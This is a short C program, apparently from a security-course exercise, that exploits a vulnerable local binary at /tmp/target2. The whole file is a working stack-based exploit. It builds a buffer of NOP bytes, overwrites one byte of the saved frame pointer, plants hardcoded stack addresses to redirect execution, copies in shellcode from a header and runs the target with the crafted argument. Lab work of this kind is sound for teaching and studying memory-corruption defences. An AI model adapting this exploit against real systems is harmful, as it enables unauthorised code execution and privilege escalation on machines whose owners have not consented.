#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target2"

int main(void)
{

	char exploit[201];
	memset(exploit, 0x90, 201); // fill the payload with nop	
	memset(exploit+200, 0x08, 1); // To set new ebp 0xbffffd08
	memcpy(exploit+64, "\x18\xfd\xff\xbf", 4); // starting point of shellcode in stack (it could be random :)) 
	memcpy(exploit+68, "\x18\xfd\xff\xbf", 4); // starting point of shellcode in stack 
	memcpy(exploit+80, shellcode, sizeof(shellcode)-1); // shellcode, -1 is for null terminator in the end of the string
  char *args[] = { TARGET, exploit, NULL };
  char *env[] = { NULL };

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
